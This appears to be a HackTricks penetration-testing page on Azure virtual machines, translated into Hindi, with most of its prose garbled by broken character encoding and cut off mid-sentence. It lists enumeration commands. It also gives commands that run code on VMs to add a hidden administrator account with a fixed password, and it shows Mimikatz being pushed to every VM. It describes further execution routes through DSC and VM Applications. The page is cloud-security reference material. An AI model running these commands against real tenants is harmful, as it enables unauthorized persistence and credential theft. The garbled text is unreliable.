# Az - рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

рдПрдЬрд╝реНрдпреВрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдПрдЬрд╝реНрдпреВрд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдХрдИ рдкреНрд░рдХрд╛рд░ рдХреА [рдСрди-рдбрд┐рдорд╛рдВрдб, рд╕реНрдХреЗрд▓реЗрдмрд▓ рдХрдВрдкреНрдпреВрдЯрд┐рдВрдЧ рд╕рдВрд╕рд╛рдзрдиреЛрдВ](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИрдВред рдЖрдорддреМрд░ рдкрд░, рдЖрдк рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдХрд╛ рдЪрдпрди рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдЖрдкрдХреЛ рдЕрдиреНрдп рд╡рд┐рдХрд▓реНрдкреЛрдВ рд╕реЗ рдЕрдзрд┐рдХ рдирд┐рдпрдВрддреНрд░рдг рдЪрд╛рд╣рд┐рдПред рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдЖрдкрдХреЛ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдмрдирд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЖрдкрдХреЛ рдХреНрдпрд╛ рд╡рд┐рдЪрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЙрд╕реЗ рдХреИрд╕реЗ рдмрдирд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рдХреИрд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рджреА рдЧрдИ рд╣реИред

## рдЧрдгрдирд╛
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **рд╡реАрдПрдо рдореЗрдВ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВ**

### **рд╡реАрдПрдо рдореЗрдВ рдПрдПрдбреА рд▓реЙрдЧрд┐рди**

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЖрдк рдпреВрдЬрд░реНрд╕ рдХреЛ AzureAD рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ **рд▓рд┐рдирдХреНрд╕ рд╡реАрдПрдо** рддрдХ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `ssh username@azure-corp.com@1.1.1.1` (рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд╕рдордп рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде рдПрдЬрд░рдХреЙрд░реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ) рдЖрдкрдХреЛ рдПрдХ рддреНрд░реБрдЯрд┐ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ рдЬреИрд╕реЗ: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

рдХреЗрд╡рд▓ **рдЙрди рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ** рдЬреЛ [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) рдкрд░ рдЬрд╛рдХрд░ рдХреЛрдб рдХреЛ рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддреЗ рд╣реИрдВ, рдИрдореЗрд▓ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрдк SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХреЗрдВрдЧреЗ (рдпрджрд┐ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ: `Virtual Machine Administrator Login` рдпрд╛ `Virtual Machine User Login` рднреВрдорд┐рдХрд╛).

### **рдЖрджреЗрд╢ рдЪрд▓рд╛рдПрдБ**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' тАУVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' тАУVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **рдХрд╕реНрдЯрдо рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЪрд▓рд╛рдПрдВ**

рдПрдЬрд╝реНрдпреВрд░ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди (рд╡реАрдПрдо) рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЫреЛрдЯреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ **рдПрдЬрд╝реНрдпреВрд░ рд╡реАрдПрдо** рдкрд░ рдкреЛрд╕реНрдЯ-рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рди **рдХрд╛рд░реНрдп** рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдХреЛ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реНрдерд╛рдкрдирд╛, рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕реБрд░рдХреНрд╖рд╛, рдпрд╛ рдЙрд╕рдХреЗ рдЕрдВрджрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдПрдХ рд╡реАрдПрдо рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕реЗ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рд╣реИ, рддреЛ рдЖрдк рд╡рд┐рдЪрд┐рддреНрд░ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### рд╡рд╛рдВрдЫрд┐рддрдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рдирд╕реНрдерд┐рддрд┐

**рд╡рд╛рдВрдЫрд┐рддрдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рдирд╕реНрдерд┐рддрд┐ (DSC)** рдЕрдВрд╕рд┐рдмрд▓ рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ PowerShell рдХреЗ рднреАрддрд░ рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рдХреЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреЛ рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред DSC рдХреЗ рдкрд╛рд╕ рдЕрдкрдиреА рдЦреБрдж рдХреА рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╣реИ рдЬреЛ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ** рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред DSC [рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document) рд╕рд┐рдВрдЯреЗрдХреНрд╕ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдХрд╛рдлреА рдЪрд┐рдбрд╝рдЪрд┐рдбрд╝реА рд╣реЛрддреА рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ DSC рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдмрд╣реБрдд рднреЛрд▓рд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдЖрджреЗрд╢ рдХреЛ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЬрд╛рдВрдЪ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛, рдЬрдм рддрдХ рд╡рд╣ рдХреБрдЫ рдирд┐рд╢реНрдЪрд┐рдд рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реЛ, рдЬреИрд╕рд╛ рдХрд┐ рдЪрд┐рддреНрд░ 5 рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕реЗ **Az PowerShell** рдлрд╝рдВрдХреНрд╢рди [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред DSC рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЛ рдПрдХ **.PS1** рдлрд╝рд╛рдЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **рдлрд╝рдВрдХреНрд╢рди** рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдПрдХ **.zip** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдкреИрдХреЗрдЬ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕рд╣реА DSC рд╕рд┐рдВрдЯреЗрдХреНрд╕ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╕реНрдерд┐рддрд┐ "рд╡рд┐рдлрд▓рддрд╛" рдХреЗ рд░реВрдк рдореЗрдВ рдкрдврд╝реА рдЬрд╛рдПрдЧреА, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреА рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕рдореЗрдВ рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╕реНрдерд┐рддрд┐ рд╡рд┐рдлрд▓рддрд╛ рд╕рдВрджреЗрд╢ рдХреЗ рд╕рд╛рде рдЕрдзрд┐рд▓рд┐рдЦрд┐рдд рд╣реЛ рдЬрд╛рддреА рд╣реИред

### VM рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░рд┐рднрд╛рд╖рд╛рдПрдБ

[VM рдПрдкреНрд▓рд┐рдХреЗрд╢рди](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) рд╕рдВрд╕рд╛рдзрди рдПрдХ рддрд░реАрдХрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ Azure VM рдкрд░ **рд╕рдВрд╕реНрдХрд░рдгрд╡рд╛рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдХреЛ рдмрд╛рд░-рдмрд╛рд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ **рдкреНрд░реЛрдЧреНрд░рд╛рдо** рдмрдирд╛рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рд╕рднреА Azure VM рдкрд░ рд╕рдВрд╕реНрдХрд░рдг 1.0 рдХреЗ рд░реВрдк рдореЗрдВ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЬрдм рдЖрдк рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ 1.1 рдореЗрдВ **рдЕрдкрдбреЗрдЯ** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдПрдХ рд╣реА VM рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдФрд░ рдкрд░рд┐рднрд╛рд╖рд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрдбреЗрдЯ рдХреЛ рдХрд┐рд╕реА рднреА VM рдкрд░ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред\
рдПрдХ VM рдкрд░ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ **рдбрд┐рдкреНрд▓реЙрдп** рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рдПрдХ рдФрд░ рд░рд╛рд╕реНрддрд╛ рд╣реИ **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди** рдХреЗ рд▓рд┐рдПред рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рджреБрд╖реНрдкреНрд░рднрд╛рд╡ рдпрд╣ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░рд┐рднрд╛рд╖рд╛ рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**рдХреБрдЫ рдХрджрдо**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ Az PowerShell рдореЗрдВ **`New-AzGalleryApplication`** рдФрд░ **`New-AzGalleryApplicationVersion`** cmdlets рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ рдПрдХ **рдПрдХреНрд╕рдЯреЗрдВрд╢рди "VMAppExtension"** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд╛рдо рдХрд░рддреА рд╣реИ рдЬреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ VM рдкрд░ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддреА рд╣реИред рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдпреВрдЖрд░рдЖрдИ рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдбрд┐рд╕реНрдХ рдкрд░ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдирд╛рдо рд╣реИ, рдпрд╛рдиреА рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдирд╛рдо 'AzApplication' рд╣реИ, рддреЛ рдбрд┐рд╕реНрдХ рдкрд░ рднреА рдлрд╝рд╛рдЗрд▓ 'AzApplication' рдХрд╣рд▓рд╛рддреА рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗред рдЗрд╕рдХреЗ рд▓рд┐рдП, рдпрд╣рд╛рдВ рдЙрдЪрд┐рдд рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдирд╛рдорд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [REST API рдХреЙрд▓](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update) рдореЗрдВ "ManageActions" рдлрд╝реАрд▓реНрдб рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдпрджрд┐ рдЖрдк рдкреВрд░рд╛ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдирд╣реАрдВ рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣рд╛рдВ рдЙрд╕реА REST API рд╡рд┐рдзрд┐ рдореЗрдВ рдпрд╛ Azure рдкреЛрд░реНрдЯрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА ManageActions рдлрд╝реАрд▓реНрдб рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рдЪрд┐рддреНрд░ PowerShell рдЖрджреЗрд╢ рдЪрд▓рд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ рдмрд╛рд░ рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдкрд░рд┐рднрд╛рд╖рд╛ рдЪрд┐рддреНрд░ 8 рдХреЗ рд╕рдорд╛рди рд╣реЛрдЧреАред

<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрди рддрдХрдиреАрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдзреАрдореА рд╣реИ (рдПрдХ рдРрдк рдпрд╛ рдЖрджреЗрд╢ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рдЧрднрдЧ 3-4 рдорд┐рдирдЯ рд▓рдЧрддреЗ рд╣реИрдВ), рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕рдХреЗ рдирдП рд╣реЛрдиреЗ рдХ
